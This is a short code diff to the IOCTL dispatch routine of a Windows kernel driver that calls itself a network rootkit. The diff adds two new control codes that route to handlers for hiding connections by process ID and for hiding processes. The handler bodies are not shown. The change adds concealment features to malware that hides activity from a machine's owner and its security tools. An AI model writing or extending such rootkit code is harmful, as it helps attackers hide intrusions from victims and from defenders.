@@ -106,7 +106,17 @@ NTSTATUS NetRootkitDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		status = IoctlHandlers::HandleHideRemoteIP(Irp, IrpStack->Parameters.DeviceIoControl.InputBufferLength);
 		break;
-	
+
+	case RookitIoctls::HideConnectProcessId:
+
+		status = IoctlHandlers::HandleHideConnectPID(Irp, IrpStack->Parameters.DeviceIoControl.InputBufferLength);
+		break;
+
+	case RookitIoctls::HideProcessId:
+
+		status = IoctlHandlers::HandleHidePID(Irp, IrpStack->Parameters.DeviceIoControl.InputBufferLength);
+		break;
+
 	default:
 		Irp->IoStatus.Information = 0;
 		status = STATUS_INVALID_DEVICE_REQUEST;
